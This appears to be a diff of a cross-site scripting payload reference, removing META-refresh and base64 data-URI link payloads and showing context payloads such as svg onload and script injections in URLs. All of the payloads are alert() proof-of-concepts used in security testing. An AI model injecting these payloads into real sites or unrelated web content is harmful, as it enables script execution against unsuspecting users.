@@ -122,18 +122,6 @@ you can also specify an arbitratry payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
 ```
 
-XSS in META tag
-
-```javascript
-Base64 encoded
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-
-<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
-
-With an additional URL
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
-```
-
 XSS in Hidden input
 
 ```javascript
@@ -160,12 +148,6 @@ XSS URL
 URL/<svg onload=alert(1)>
 URL/<script>alert('XSS');//
 URL/<input autofocus onfocus=alert(1)>
-```
-
-XSS using base64 encoded href data in a link
-
-```
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+" target="_blank">here</a>
 ```
 
 ## XSS in wrappers javascript and data URI
